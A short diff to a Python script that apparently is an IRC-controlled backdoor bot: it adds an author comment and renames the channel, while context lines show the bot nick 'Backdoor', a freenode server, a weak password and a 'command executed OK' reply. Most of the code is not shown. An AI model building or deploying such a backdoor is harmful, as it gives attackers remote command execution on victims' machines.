@@ -1,5 +1,6 @@
 #! /usr/bin/python
 #coding: utf-8
+#by: Mharcos Nesster
 import socket
 from re import search
 import sys,os
@@ -57,7 +58,7 @@ class bot:
                 self.sock.send("PRIVMSG %s : comando executado OK \r\n" % canal)
 #------------------------------------- variaveis do server   -----------------------------
 Server = "irc.freenode.net"
-Channel = "#nesster"
+Channel = "#canal" 
 Porta = 6667
 Nick = "Backdoor"
 Senha = "123456"
